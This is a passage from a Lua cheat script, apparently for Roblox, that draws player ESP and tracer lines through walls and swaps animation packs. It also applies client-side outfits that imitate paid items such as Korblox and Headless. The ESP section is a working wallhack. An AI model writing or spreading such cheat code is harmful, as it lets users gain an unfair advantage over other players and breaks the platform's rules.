medusaResetConns = {}; medusaResetDebounce = false end local lineESPEnabled = false; local speedESPEnabled = false; local PlayerESP = { enabled = false, conns = {}, playerData = {} }; local TracerESP = { drawings = {}, conn = nil, gui = nil } local function startPlayerESP() if PlayerESP.enabled then return end PlayerESP.enabled = true local function cleanup(plr) local d = PlayerESP.playerData[plr] if not d then return end pcall(function() if d.highlight then d.highlight:Destroy() end end) pcall(function() if d.billboard then d.billboard:Destroy() end end)
for _, c in ipairs(d.conns or {}) do pcall(function() c:Disconnect() end) end PlayerESP.playerData[plr] = nil end local function setupPlayer(plr, char) if not PlayerESP.enabled or plr == LP then return end cleanup(plr); char = char or plr.Character if not char then return end local hrp = char:FindFirstChild("HumanoidRootPart"); local head = char:FindFirstChild("Head") or hrp if not hrp then return end
local hl = Instance.new("Highlight"); hl.Name = "SevenUpPlayerESP"; hl.Adornee = char; hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop; local acc = (S and S.themeColor) or (COLORS and COLORS.accent) or Color3.fromRGB(230, 230, 235); hl.FillColor = acc; hl.FillTransparency = 0.72; hl.OutlineColor = acc; hl.OutlineTransparency = 0.08; hl.Parent = char; local bb = Instance.new("BillboardGui"); bb.Name = "SevenUpPlayerESP_BB"; bb.Adornee = head; bb.Size = UDim2.new(0, 120, 0, 28); bb.StudsOffset = Vector3.new(0, 2.8, 0); bb.AlwaysOnTop = true; bb.MaxDistance = 600; local lbl = Instance.new("TextLabel", bb); lbl.Size = UDim2.new(1, 0, 1, 0); lbl.BackgroundTransparency = 1; lbl.Text = plr.DisplayName or plr.Name; lbl.TextColor3 = (S and S.themeColor) or (COLORS and COLORS.accent) or Color3.fromRGB(230, 230, 235); lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 12; lbl.TextStrokeTransparency = 0.3
pcall(function() bb.Parent = game:GetService("CoreGui") end) if not bb.Parent then pcall(function() bb.Parent = LP:FindFirstChild("PlayerGui") end) end local lastEspUp = 0 local conn = RunService.Heartbeat:Connect(function() if not PlayerESP.enabled or not hrp.Parent then return end local now = os.clock(); local interval = _IS_MOBILE and 0.22 or 0.08 if (now - lastEspUp) < interval then return end lastEspUp = now; local v = hrp.AssemblyLinearVelocity; local spd = Vector3.new(v.X, 0, v.Z).Magnitude; lbl.Text = string.format("%s\n%.0f sps", plr.DisplayName or plr.Name, spd) end)
PlayerESP.playerData[plr] = { highlight = hl, billboard = bb, conns = { conn } } end for _, plr in ipairs(Players:GetPlayers()) do if plr ~= LP then table.insert(PlayerESP.conns, plr.CharacterAdded:Connect(function(c) task.defer(setupPlayer, plr, c) end)) if plr.Character then task.defer(setupPlayer, plr, plr.Character) end end end table.insert(PlayerESP.conns, Players.PlayerAdded:Connect(function(plr) table.insert(PlayerESP.conns, plr.CharacterAdded:Connect(function(c) task.defer(setupPlayer, plr, c) end)) end)) table.insert(PlayerESP.conns, Players.PlayerRemoving:Connect(cleanup)) end
local function stopPlayerESP() PlayerESP.enabled = false for _, c in ipairs(PlayerESP.conns or {}) do pcall(function() c:Disconnect() end) end PlayerESP.conns = {} for plr, d in pairs(PlayerESP.playerData) do pcall(function() if d.highlight then d.highlight:Destroy() end end) pcall(function() if d.billboard then d.billboard:Destroy() end end) for _, c in ipairs(d.conns or {}) do pcall(function() c:Disconnect() end) end end PlayerESP.playerData = {} end local function ensureTracerGui() if TracerESP.gui and TracerESP.gui.Parent then return TracerESP.gui end
local g = Instance.new("ScreenGui"); g.Name = "VersincTracerESP"; g.IgnoreGuiInset = true; g.DisplayOrder = 50; g.ResetOnSpawn = false pcall(function() g.Parent = game:GetService("CoreGui") end) if not g.Parent then pcall(function() g.Parent = LP:FindFirstChild("PlayerGui") end) end TracerESP.gui = g return g end local function tracerCleanup(plr) local d = TracerESP.drawings[plr] if d then pcall(function() if d.line then d.line:Destroy() end end) TracerESP.drawings[plr] = nil end end local function startTracerESP() if TracerESP.conn then pcall(function() TracerESP.conn:Disconnect() end)
TracerESP.conn = nil end for plr in pairs(TracerESP.drawings) do tracerCleanup(plr) end ensureTracerGui(); S.showTracerEnabled = true TracerESP.conn = RunService.Heartbeat:Connect(function() if not S.showTracerEnabled and not (K7 and K7.lineESPEnabled) then for plr in pairs(TracerESP.drawings) do tracerCleanup(plr) end return end if not _perfEveryN(3, 1) then return end if not TracerESP.gui or not TracerESP.gui.Parent then return end local myChar = LP.Character; local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart") if not myRoot then return end local cam = workspace.CurrentCamera
if not cam then return end local seen = {} for _, plr in ipairs(Players:GetPlayers()) do if plr ~= LP and plr.Character then local tr = plr.Character:FindFirstChild("HumanoidRootPart") if tr then seen[plr] = true; local sp, son; do local __m = {cam:WorldToViewportPoint(myRoot.Position)}; sp = __m[1]; son = __m[2]; end; local ep, eon; do local __m = {cam:WorldToViewportPoint(tr.Position)}; ep = __m[1]; eon = __m[2]; end if son and eon then local line = TracerESP.drawings[plr] and TracerESP.drawings[plr].line if not line then
line = Instance.new("Frame"); line.Name = "Tracer_" .. plr.Name; line.AnchorPoint = Vector2.new(0.5, 0.5); line.BorderSizePixel = 0; line.BackgroundColor3 = (S and S.themeColor) or (COLORS and COLORS.accent) or Color3.fromRGB(230, 230, 235); line.BackgroundTransparency = 0.15; line.Parent = TracerESP.gui; TracerESP.drawings[plr] = { line = line } end
local dx, dy = ep.X - sp.X, ep.Y - sp.Y; local len = math.sqrt(dx * dx + dy * dy); line.Size = UDim2.fromOffset(math.max(1, len), 2); line.Position = UDim2.fromOffset((sp.X + ep.X) / 2, (sp.Y + ep.Y) / 2); line.Rotation = math.deg(math.atan2(dy, dx)); line.Visible = true else tracerCleanup(plr) end end end end for plr in pairs(TracerESP.drawings) do if not seen[plr] then tracerCleanup(plr) end end end) end local function stopTracerESP() S.showTracerEnabled = false if TracerESP.conn then TracerESP.conn:Disconnect(); TracerESP.conn = nil end
for plr in pairs(TracerESP.drawings) do tracerCleanup(plr) end if TracerESP.gui then pcall(function() TracerESP.gui:Destroy() end); TracerESP.gui = nil end end local function refreshESP() stopPlayerESP(); stopTracerESP() if not K7 then return end if K7.lineESPEnabled or K7.speedESPEnabled then startPlayerESP(); startTracerESP() end end if K7 then K7.refreshESP = refreshESP end local animPackEnabled = false; local animPackName = "Tryhard"; local savedAnimateClone = nil; local applyingAnim = false local ANIM_PACKS = { ["Tryhard"] = {
Animation1 = 133806214992291, Animation2 = 94970088341563, WalkAnim = 707897309, RunAnim = 707861613, JumpAnim = 116936326516985, FallAnim = 116936326516985, ClimbAnim = 116936326516985, Swim = 116936326516985, SwimIdle = 116936326516985, }, ["Crazy"] = { Animation1 = 133806214992291, Animation2 = 94970088341563, WalkAnim = 134824450619865, RunAnim = 134824450619865, JumpAnim = 121454505477205, FallAnim = 94788218468396, ClimbAnim = 121454505477205, Swim = 121454505477205, SwimIdle = 121454505477205, }, ["Adidas Sports"] = {
Animation1 = 18537376492, Animation2 = 18537371272, WalkAnim = 18537392113, RunAnim = 18537384940, JumpAnim = 18537380791, FallAnim = 18537367238, ClimbAnim = 18537363391, Swim = 18537389531, SwimIdle = 18537387180, }, ["Adidas Community"] = { Animation1 = 122257458498464, Animation2 = 102357151005774, WalkAnim = 122150855457006, RunAnim = 82598234841035, JumpAnim = 75290611992385, FallAnim = 98600215928904, ClimbAnim = 88763136693023, Swim = 133308483266208, SwimIdle = 109346520324160, }, ["Adidas Aura"] = {
Animation1 = 110211186840347, Animation2 = 114191137265065, WalkAnim = 83842218823011, RunAnim = 118320322718866, JumpAnim = 109996626521204, FallAnim = 95603166884636, ClimbAnim = 97824616490448, Swim = 134530128383903, SwimIdle = 94922130551805, }, ["Wicked Popular"] = { Animation1 = 118832222982049, Animation2 = 76049494037641, WalkAnim = 92072849924640, RunAnim = 72301599441680, JumpAnim = 104325245285198, FallAnim = 121152442762481, ClimbAnim = 131326830509784, Swim = 99384245425157, SwimIdle = 113199415118199, }, ["Elder"] = {
Animation1 = 10921101664, Animation2 = 10921102574, WalkAnim = 10921111375, RunAnim = 10921104374, JumpAnim = 10921107367, FallAnim = 10921105765, ClimbAnim = 10921100400, Swim = 10921108971, SwimIdle = 10921110137, }, ["Zombie"] = { Animation1 = 10921344533, Animation2 = 10921345376, WalkAnim = 10921355261, RunAnim = 616163682, JumpAnim = 10921351278, FallAnim = 10921350320, ClimbAnim = 10921343576, Swim = 10921352344, SwimIdle = 10921353442, }, ["Mage"] = {
Animation1 = 10921144709, Animation2 = 10921145797, WalkAnim = 10921152678, RunAnim = 10921148209, JumpAnim = 10921149743, FallAnim = 10921148939, ClimbAnim = 10921143404, Swim = 10921150788, SwimIdle = 10921151661, }, ["Catwalk Glam"] = { Animation1 = 133806214992291, Animation2 = 94970088341563, WalkAnim = 109168724482748, RunAnim = 81024476153754, JumpAnim = 116936326516985, FallAnim = 92294537340807, ClimbAnim = 119377220967554, Swim = 134591743181628, SwimIdle = 98854111361360, }, ["Astronaut"] = {
Animation1 = 10921034824, Animation2 = 10921036806, WalkAnim = 10921046031, RunAnim = 10921039308, JumpAnim = 10921042494, FallAnim = 10921040576, ClimbAnim = 10921032124, Swim = 10921044000, SwimIdle = 10921045006, }, ["Werewolf"] = { Animation1 = 10921330408, Animation2 = 10921333667, WalkAnim = 10921342074, RunAnim = 10921336997, JumpAnim = 10921337907, FallAnim = 10921337907, ClimbAnim = 10921329322, Swim = 10921340419, SwimIdle = 10921341319, }, ["Superhero"] = {
Animation1 = 10921288909, Animation2 = 10921290167, WalkAnim = 10921298616, RunAnim = 10921291831, JumpAnim = 10921294559, FallAnim = 10921293373, ClimbAnim = 10921286911, Swim = 10921295495, SwimIdle = 10921297391, }, ["Toy"] = { Animation1 = 10921301576, Animation2 = 10921301576, WalkAnim = 10921312010, RunAnim = 10921306285, JumpAnim = 10921308158, FallAnim = 10921307241, ClimbAnim = 10921300839, Swim = 10921309319, SwimIdle = 10921310341, }, ["No Boundaries"] = {
Animation1 = 18747067405, Animation2 = 18747063918, WalkAnim = 18747074203, RunAnim = 18747070484, JumpAnim = 18747069148, FallAnim = 18747062535, ClimbAnim = 18747060903, Swim = 18747073181, SwimIdle = 18747071682, }, ["NFL"] = { Animation1 = 92080889861410, Animation2 = 74451233229259, WalkAnim = 110358958299415, RunAnim = 117333533048078, JumpAnim = 119846112151352, FallAnim = 129773241321032, ClimbAnim = 134630013742019, Swim = 132697394189921, SwimIdle = 79090109939093, }, ["Vampire"] = {
Animation1 = 10921315373, Animation2 = 10921315373, WalkAnim = 10921326949, RunAnim = 10921320299, JumpAnim = 10921322186, FallAnim = 10921321317, ClimbAnim = 10921314188, Swim = 10921324408, SwimIdle = 10921325443, }, ["Ninja"] = { Animation1 = 656117400, Animation2 = 656118341, WalkAnim = 656121766, RunAnim = 656118852, JumpAnim = 656117878, FallAnim = 656115606, ClimbAnim = 656114359, Swim = 656119721, SwimIdle = 656121397, }, ["Robot"] = {
Animation1 = 616088211, Animation2 = 616089559, WalkAnim = 616095330, RunAnim = 616091570, JumpAnim = 616090535, FallAnim = 616087089, ClimbAnim = 616086039, Swim = 616092998, SwimIdle = 616094091, }, ["Levitation"] = { Animation1 = 616006778, Animation2 = 616008087, WalkAnim = 616013216, RunAnim = 616010382, JumpAnim = 616008936, FallAnim = 616005863, ClimbAnim = 616003713, Swim = 616011509, SwimIdle = 616012453, }, ["Stylish"] = {
Animation1 = 616136790, Animation2 = 616138447, WalkAnim = 616146177, RunAnim = 616140816, JumpAnim = 616139451, FallAnim = 616134815, ClimbAnim = 616133594, Swim = 616143378, SwimIdle = 616144772, }, ["Bubbly"] = { Animation1 = 910004836, Animation2 = 910009958, WalkAnim = 910034870, RunAnim = 910025107, JumpAnim = 910016857, FallAnim = 910001910, ClimbAnim = 909997997, Swim = 910028158, SwimIdle = 910030921, }, ["Cartoon"] = {
Animation1 = 742637544, Animation2 = 742638445, WalkAnim = 742640026, RunAnim = 742638842, JumpAnim = 742637942, FallAnim = 742637151, ClimbAnim = 742636889, Swim = 742639220, SwimIdle = 742639812, }, ["Wicked Dancing"] = { Animation1 = 92849173543269, Animation2 = 132238900951109, WalkAnim = 73718308412641, RunAnim = 135515454877967, JumpAnim = 78508480717326, FallAnim = 78147885297412, ClimbAnim = 129447497744818, Swim = 110657013921774, SwimIdle = 129183123083281, }, ["Normal"] = {
Animation1 = 507766388, Animation2 = 507766666, WalkAnim = 507777826, RunAnim = 507767714, JumpAnim = 507765000, FallAnim = 507767968, ClimbAnim = 507765644, Swim = 507784897, SwimIdle = 507784897, }, } local ANIM_PACK_LIST = {"Tryhard","Crazy","Adidas Sports","Adidas Community","Adidas Aura","Wicked Popular","Elder","Zombie","Mage","Catwalk Glam","Astronaut","Werewolf","Superhero","Toy","No Boundaries","NFL","Vampire","Ninja","Robot","Levitation","Stylish","Bubbly","Cartoon","Wicked Dancing","Normal"} local animPackIndex = 1 local function setAnimId(obj, id)
if not obj or not id then return end local idStr = type(id) == "number" and ("rbxassetid://" .. tostring(id)) or tostring(id) if not idStr:find("rbxassetid://") and tonumber(idStr) then idStr = "rbxassetid://" .. idStr end pcall(function() if obj:IsA("Animation") then obj.AnimationId = idStr elseif obj:IsA("StringValue") then obj.Value = idStr end end) end local function applyAnimPack(name) if not K7.animPackEnabled then return end if applyingAnim then return end name = name or K7.animPackName if not name or name == "" then applyingAnim = false; return end
K7.animPackName = name; applyingAnim = true; local pack = ANIM_PACKS[name] if not pack then applyingAnim = false; return end local char = LP.Character if not char then applyingAnim = false; return end local animate = char:FindFirstChild("Animate") if not animate then applyingAnim = false; return end if not savedAnimateClone then pcall(function() savedAnimateClone = animate:Clone() end) end local hum = char:FindFirstChildOfClass("Humanoid") if hum then for _, t in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() t:Stop(0) end) end end local function ensure(folder, animName)
if not folder then return nil end local a = folder:FindFirstChild(animName) if not a then a = Instance.new("Animation"); a.Name = animName; a.Parent = folder end return a end local function setFolderAnim(folderName, animName, id) if not id then return end local folder = animate:FindFirstChild(folderName) if not folder then folder = Instance.new("Folder"); folder.Name = folderName; folder.Parent = animate end setAnimId(ensure(folder, animName), id) for _, ch in ipairs(folder:GetChildren()) do if ch:IsA("Animation") or ch:IsA("StringValue") then setAnimId(ch, id) end end end
setFolderAnim("walk", "WalkAnim", pack.WalkAnim); setFolderAnim("run", "RunAnim", pack.RunAnim); setFolderAnim("jump", "JumpAnim", pack.JumpAnim); setFolderAnim("fall", "FallAnim", pack.FallAnim); setFolderAnim("climb", "ClimbAnim", pack.ClimbAnim); setFolderAnim("swim", "Swim", pack.Swim); setFolderAnim("swimidle", "SwimIdle", pack.SwimIdle); local idle = animate:FindFirstChild("idle") if not idle then idle = Instance.new("Folder"); idle.Name = "idle"; idle.Parent = animate end if idle then
setAnimId(ensure(idle, "Animation1"), pack.Animation1); setAnimId(ensure(idle, "Animation2"), pack.Animation2 or pack.Animation1) for _, ch in ipairs(idle:GetChildren()) do if ch:IsA("Animation") or ch:IsA("StringValue") then if ch.Name:find("1") then setAnimId(ch, pack.Animation1) elseif ch.Name:find("2") then setAnimId(ch, pack.Animation2 or pack.Animation1) end end end end animate.Disabled = true; task.wait(0.05); animate.Disabled = false; animPackName = name; K7.animPackName = name; applyingAnim = false; print("[Zombie.Vs] Anim pack applied:", name) end local function resetAnimPack()
local char = LP.Character if not char then return end local animate = char:FindFirstChild("Animate") if animate then animate:Destroy() end if savedAnimateClone then local n = savedAnimateClone:Clone(); n.Parent = char; n.Disabled = true; task.wait(0.05); n.Disabled = false end end K7.applySkyTheme = applySkyTheme; K7.cycleSkyTheme = cycleSkyTheme; K7.applyFOV = applyFOV; K7.enableStretchRez = enableStretchRez; K7.disableStretchRez = disableStretchRez; K7.applyHeadless = applyHeadless; K7.applyKorblox = applyKorblox; K7.korbloxSide = korbloxSide
K7.setKorbloxSide = function(n) korbloxSide = n; K7.korbloxSide = n end K7.startBodyLock = startBodyLock; K7.stopBodyLock = stopBodyLock; K7.startMedusaReset = startMedusaReset; K7.stopMedusaReset = stopMedusaReset; K7.refreshESP = refreshESP; K7.applyAnimPack = applyAnimPack; K7.resetAnimPack = resetAnimPack; K7.ANIM_PACK_LIST = ANIM_PACK_LIST if K7.currentSkyTheme == nil then K7.currentSkyTheme = currentSkyTheme end if K7.skyThemeIndex == nil then K7.skyThemeIndex = skyThemeIndex end if K7.fovValue == nil then K7.fovValue = fovValue end
-- ===== [Zombie.Vs] Accessory Pack (Zombie + Y-out skins) =====
do
local ACCESSORY_PACK_LIST = {"Off", "Skin 1", "Skin 2", "Skin 3", "Skin 4", "Skin 5", "Skin 6", "Skin 7"}
local BLEED_PACKS = {
    ["Skin 1"] = { accessory = 306969564, offset = Vector3.new(0, 0.3, 0), headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", shirt = "http://www.roblox.com/asset/?id=10632503795", pants = "http://www.roblox.com/asset/?id=123161592384863", korblox = "right" },
    ["Skin 2"] = { accessory = 1744060292, offset = Vector3.new(0, 1.4, -0.2), headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", shirt = "http://www.roblox.com/asset/?id=11526718530", pants = "http://www.roblox.com/asset/?id=93710523210027", korblox = "right" },
    ["Skin 3"] = { accessory = 112564966849233, offset = Vector3.new(0, 0.6, 0), headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", shirt = "http://www.roblox.com/asset/?id=11849088376", pants = "http://www.roblox.com/asset/?id=16534673928", korblox = "right" },
    ["Skin 4"] = { accessory = 10159600649, offset = Vector3.new(0, 1, -0.2), headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", shirt = "http://www.roblox.com/asset/?id=9683332638", pants = "http://www.roblox.com/asset/?id=93182020184041", korblox = "none" },
    ["Skin 5"] = { accessory = 8349240186, offset = Vector3.new(0, 0.9, 0), headMesh = "https://assetdelivery.roblox.com/v1/asset/?id=16673245747", headTexture = nil, shirt = "http://www.roblox.com/asset/?id=11926549070", pants = "http://www.roblox.com/asset/?id=13189494471", korblox = "none" },
    ["Skin 6"] = { accessory = 121097973925756, offset = Vector3.new(0, 0.9, 0), headMesh = "http://www.roblox.com/asset/?id=134079402", headTexture = "http://www.roblox.com/asset/?id=133940918", shirt = "http://www.roblox.com/asset/?id=123181702116947", pants = "http://www.roblox.com/asset/?id=93330291631062", korblox = "none" },
}

local ORIG = { shirt = nil, pants = nil, accessories = {} }

local function saveOriginalOutfit(char)
    if not char then return end
    local shirt = char:FindFirstChildWhichIsA("Shirt")
    local pants = char:FindFirstChildWhichIsA("Pants")
    ORIG.shirt = shirt and shirt.ShirtTemplate or nil
    ORIG.pants = pants and pants.PantsTemplate or nil
end

local function clearAllOutfit(char)
    if not char then return end
    for _, obj in ipairs(char:GetChildren()) do
        if obj:IsA("Shirt") or obj:IsA("Pants") then pcall(function() obj:Destroy() end) end
    end
end

local function restoreOriginalOutfit(char)
    if not char then return end
    clearAllOutfit(char)
    if ORIG.shirt then local s = Instance.new("Shirt"); s.ShirtTemplate = ORIG.shirt; s.Parent = char end
    if ORIG.pants then local p = Instance.new("Pants"); p.PantsTemplate = ORIG.pants; p.Parent = char end
    ORIG.shirt = nil; ORIG.pants = nil
end

local function saveOriginalAccessories(char)
    ORIG.accessories = {}
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Hat") then
            pcall(function() table.insert(ORIG.accessories, child:Clone()) end)
        end
    end
end

local function clearAllAccessories(char)
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
        pcall(function()
            if child:IsA("Accessory") or child:IsA("Hat") or child.Name == "AuFfitAccessory" then child:Destroy()
            elseif child.Name:find("Korblox_") or child.Name:find("Headless_") then child:Destroy() end
        end)
    end
    for _, partName in ipairs({"Head", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot"}) do
        local part = char:FindFirstChild(partName)
        if part and part:IsA("BasePart") then part.Transparency = 0 end
    end
end

local function restoreOriginalAccessories(char)
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
        pcall(function()
            if child:IsA("Accessory") or child:IsA("Hat") or child.Name == "AuFfitAccessory" then child:Destroy() end
        end)
    end
    for _, clone in ipairs(ORIG.accessories) do
        pcall(function()
            local newAcc = clone:Clone()
            newAcc.Parent = char
            for _, weld in ipairs(newAcc:GetDescendants()) do
                if weld:IsA("Weld") or weld:IsA("WeldConstraint") then
                    local p0 = weld.Part0 and weld.Part0.Name
                    local p1 = weld.Part1 and weld.Part1.Name
                    if p0 then local n = char:FindFirstChild(p0) if n then weld.Part0 = n end end
                    if p1 then local n = char:FindFirstChild(p1) if n then weld.Part1 = n end end
                end
            end
        end)
    end
    ORIG.accessories = {}
end

local HOMERO_CFG = {
    body = { 10725826963, 86500008, 86500054, 86500036, 86500064, 86500078 },
    items = {
        { id = 103227869700418, offset = CFrame.new(0,0,0) },
        { id = 84952305140948,   offset = CFrame.new(0,0,0) },
        { id = 122465238537030,  offset = CFrame.new(0,0,0) },
    },
    pants = "rbxassetid://78591690208112",
    skinColor = Color3.fromRGB(234,184,146),
    headColor = Color3.fromRGB(0,0,0),
}
local HOMERO_TAG = "ZombieVS_Homero_"

local function zombieLoadObjects(id)
    local ok, res; do local __m = {pcall(function() return game:GetObjects("rbxassetid://" .. tostring(id)) end)}; ok = __m[1]; res = __m[2]; end
    if ok and typeof(res) == "table" and #res > 0 then return res end
    do local __m = {pcall(function() return game:GetService("InsertService"):LoadAsset(id) end)}; ok = __m[1]; res = __m[2]; end
    if ok and res then return {res} end
    return nil
end

local function zombieCollectParts(objs)
    local out = {}
    for _, o in ipairs(objs or {}) do
        if o:IsA("BasePart") then table.insert(out, o) end
        for _, d in ipairs(o:GetDescendants()) do
            if d:IsA("BasePart") then table.insert(out, d) end
        end
    end
    return out
end

local function zombieFindAttachment(char, name)
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("Attachment") and p.Name == name and p.Parent:IsA("BasePart") then
            return p
        end
    end
end

local function applyZombieHomero(char)
    if not char then return false end
    char:WaitForChild("Humanoid", 10)
    char:WaitForChild("Head", 10)

    for _, d in ipairs(char:GetChildren()) do
        if d.Name:sub(1, #HOMERO_TAG) == HOMERO_TAG then
            pcall(function() d:Destroy() end)
        end
    end

    local bc = char:FindFirstChildWhichIsA("BodyColors") or Instance.new("BodyColors")
    bc.HeadColor3 = HOMERO_CFG.headColor
    bc.TorsoColor3 = HOMERO_CFG.skinColor
    bc.LeftArmColor3, bc.RightArmColor3 = HOMERO_CFG.skinColor, HOMERO_CFG.skinColor
    bc.LeftLegColor3, bc.RightLegColor3 = HOMERO_CFG.skinColor, HOMERO_CFG.skinColor
    bc.Parent = char

    local pants = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
    pants.Name = "Pants"
    pants.PantsTemplate = HOMERO_CFG.pants
    pants.Parent = char

    for _, a in ipairs(char:GetChildren()) do
        if a:IsA("Accessory") then
            local h = a:FindFirstChild("Handle")
            if h then h.Transparency = 1 end
        end
    end

    for _, id in ipairs(HOMERO_CFG.body) do
        local objs = zombieLoadObjects(id)
        if objs then
            for _, mp in ipairs(zombieCollectParts(objs)) do
                local orig = char:FindFirstChild(mp.Name)
                if orig and orig:IsA("BasePart") then
                    local c = mp:Clone()
                    c.Name = HOMERO_TAG .. "body_" .. mp.Name
                    c.CanCollide = false
                    c.Anchored = false
                    c.Massless = true
                    c.Size = orig.Size
                    c.CFrame = orig.CFrame
                    c.Parent = char
                    local w = Instance.new("WeldConstraint")
                    w.Part0, w.Part1 = orig, c
                    w.Parent = c
                    orig.Transparency = 1
                end
            end
            for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
        end
    end

    for _, entry in ipairs(HOMERO_CFG.items) do
        local objs = zombieLoadObjects(entry.id)
        if objs then
            local handle
            for _, p in ipairs(zombieCollectParts(objs)) do
                if p.Name == "Handle" then handle = p break end
                if not handle then handle = p end
            end
            if handle then
                local h = handle:Clone()
                h.Name = HOMERO_TAG .. "item_" .. tostring(entry.id)
                h.CanCollide = false
                h.Anchored = false
                h.Massless = true
                local head = char:FindFirstChild("Head")
                if head then
                    local att = h:FindFirstChildOfClass("Attachment")
                    local batt = att and zombieFindAttachment(char, att.Name)
                    local target = batt and batt.Parent or head
                    local c0 = batt and (batt.CFrame * (entry.offset or CFrame.new())) or (entry.offset or CFrame.new(0,1.4,0))
                    local c1 = batt and att.CFrame or CFrame.new()
                    h.CFrame = target.CFrame * c0 * c1:Inverse()
                    h.Parent = char
                    local w = Instance.new("Weld")
                    w.Part0, w.Part1 = target, h
                    w.C0, w.C1 = c0, c1
                    w.Parent = h
                else
                    h:Destroy()
                end
            end
            for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
        end
    end
    return true
end

local function applyBleedOutfit(packName)
    local config = BLEED_PACKS[packName]
    if not config then return false end
    local char = LP.Character
    if not char then return false end
    char:WaitForChild("Head", 10)
    local head = char:FindFirstChild("Head")
    if not head then return false end

    if config.headMesh then
        for _, d in ipairs(char:GetChildren()) do
            if d:IsA("CharacterMesh") and d.BodyPart == Enum.BodyPart.Head then pcall(function() d:Destroy() end) end
        end
        local done = false
        if head:IsA("MeshPart") then
            done = pcall(function()
                head.MeshId = config.headMesh
                if config.headTexture then head.TextureID = config.headTexture end
            end)
        end
        if not done then
            pcall(function()
                local sm = head:FindFirstChildWhichIsA("SpecialMesh") or Instance.new("SpecialMesh")
                sm.Parent = head
                sm.MeshType = Enum.MeshType.FileMesh
                sm.MeshId = config.headMesh
                sm.TextureId = config.headTexture or ""
            end)
        end
    end

    if config.shirt then
        local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
        s.Name = "Shirt"; s.ShirtTemplate = config.shirt; s.Parent = char
    end
    if config.pants then
        local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
        p.Name = "Pants"; p.PantsTemplate = config.pants; p.Parent = char
    end

    if config.accessory then
        local old = char:FindFirstChild("AuFfitAccessory")
        if old then pcall(function() old:Destroy() end) end
        local objs = nil
        local ok, res; do local __m = {pcall(function() return game:GetObjects("rbxassetid://" .. tostring(config.accessory)) end)}; ok = __m[1]; res = __m[2]; end
        if ok and typeof(res) == "table" and #res > 0 then
            objs = res
        else
            do local __m = {pcall(function() return game:GetService("InsertService"):LoadAsset(config.accessory) end)}; ok = __m[1]; res = __m[2]; end
            if ok and res then objs = { res } end
        end
        if objs then
            local handle
            for _, o in ipairs(objs) do
                if o:IsA("BasePart") then handle = o break end
                local f = o:FindFirstChildWhichIsA("BasePart", true)
                if f then handle = f break end
            end
            if handle then
                local h = handle:Clone()
                h.Name = "AuFfitAccessory"; h.CanCollide = false; h.Anchored = false; h.Massless = true; h.Parent = char
                local weld = Instance.new("Weld")
                weld.Part0 = head; weld.Part1 = h
                weld.C0 = CFrame.new(config.offset or Vector3.zero)
                weld.Parent = h
            end
            for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
        end
    end

    if config.korblox and config.korblox ~= "none" then
        local side = config.korblox
        local ids = { left = 139607673, right = 139607718 }
        local targets = { left = "LeftUpperLeg", right = "RightUpperLeg" }
        local hides = { left = {"LeftUpperLeg", "LeftLowerLeg", "LeftFoot"}, right = {"RightUpperLeg", "RightLowerLeg", "RightFoot"} }
        local targetPart = char:FindFirstChild(targets[side])
        if targetPart then
            for _, partName in ipairs(hides[side]) do
                local limb = char:FindFirstChild(partName)
                if limb and limb:IsA("BasePart") then limb.Transparency = 1 end
            end
            local success, objects; do local __m = {pcall(function() return game:GetObjects("rbxassetid://" .. ids[side]) end)}; success = __m[1]; objects = __m[2]; end
            if success and objects and #objects > 0 then
                local assetModel = objects[1]
                local mainMesh = assetModel:IsA("BasePart") and assetModel or assetModel:FindFirstChildWhichIsA("BasePart", true)
                if mainMesh then
                    mainMesh.CanCollide = false; mainMesh.Massless = true; mainMesh.CFrame = targetPart.CFrame
                    local weld = Instance.new("WeldConstraint")
                    weld.Part0 = targetPart; weld.Part1 = mainMesh; weld.Parent = mainMesh
                    assetModel.Parent = char
                else
                    pcall(function() assetModel:Destroy() end)
                end
            end
        end
    end
    return true
end

local function applyAccessoryPack(packName)
    packName = packName or K7.accessoryPackName or "Off"
    local char = LP.Character
    if not char then return end
    K7.accessoryPackName = packName
    if packName == "Off" then
        clearAllAccessories(char)
        restoreOriginalOutfit(char)
        restoreOriginalAccessories(char)
        print("[Zombie.Vs] Accessory pack: Off")
        return
    end
    if packName == "Skin 7" or packName == "Homero" then
        if not ORIG.shirt and not ORIG.pants then saveOriginalOutfit(char) end
        if #ORIG.accessories == 0 then saveOriginalAccessories(char) end
        clearAllOutfit(char)
        clearAllAccessories(char)
        pcall(applyZombieHomero, char)
        print("[Zombie.Vs] Accessory pack applied: Skin 7 (Homero)")
        return
    end
    if not ORIG.shirt and not ORIG.pants then saveOriginalOutfit(char) end
    if #ORIG.accessories == 0 then saveOriginalAccessories(char) end
    clearAllOutfit(char)
    clearAllAccessories(char)
    pcall(applyBleedOutfit, packName)
    print("[Zombie.Vs] Accessory pack applied:", packName)
end

local function resetAccessoryPack()
    K7.accessoryPackName = "Off"
    pcall(applyAccessoryPack, "Off")
end

pcall(function()
    LP.CharacterAdded:Connect(function()
        task.wait(1.5)
        if K7.accessoryPackEnabled and K7.accessoryPackName and K7.accessoryPackName ~= "Off" then
            pcall(applyAccessoryPack, K7.accessoryPackName)
        end
    end)
end)

K7.ACCESSORY_PACK_LIST = ACCESSORY_PACK_LIST
K7.applyAccessoryPack = applyAccessoryPack
K7.resetAccessoryPack = resetAccessoryPack
